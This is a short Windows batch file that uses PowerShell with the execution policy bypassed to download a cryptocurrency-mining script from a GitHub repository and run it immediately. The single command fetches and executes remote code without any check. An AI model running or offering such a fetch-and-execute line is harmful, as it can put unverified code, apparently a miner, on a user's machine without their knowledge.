@echo off
:: Download the PowerShell script from GitHub and save it locally
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Mrx-coder-1157/mining-scripts/raw/main/StartMining.ps1' -OutFile 'C:\Miners\StartMining.ps1'; & 'C:\Miners\StartMining.ps1'"

:: End the batch file
exit
